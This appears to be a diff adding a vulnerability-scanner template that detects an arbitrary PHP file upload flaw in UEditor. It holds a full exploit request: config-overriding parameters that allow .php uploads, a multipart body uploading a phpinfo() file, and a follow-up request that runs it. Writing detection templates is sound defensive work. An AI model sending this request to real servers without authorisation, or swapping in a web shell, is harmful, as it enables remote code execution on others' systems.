@@ -1,0 +1,51 @@
+id: ueditor-arbitrary-file-upload
+brief:
+    title: UEditor - PHP Arbitrary File Upload
+    by: ChiragArtani
+    level: medium
+    about: Detects arbitrary file upload vulnerability in UEditor PHP  by attempting to upload and execute a PHP file. This vulnerability allows remote attackers to upload arbitrary files including PHP files,...
+    label:
+        - ueditor
+        - file-upload
+        - rce
+        - intrusive
+        - vuln
+    score: CVSS:6.1
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{filename}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{filename}}'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+      body: |-
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="{{filename}}"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+      signs:
+        - "on": word
+          has:
+            - PHP Extension
+            - PHP Version
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/php/upload/{{filename}}.php'
+      signs:
+        - "on": word
+          has:
+            - PHP Extension
+            - PHP Version
+          in: body_2
+          need: all
+        - "on": status
+          status:
+            - 200
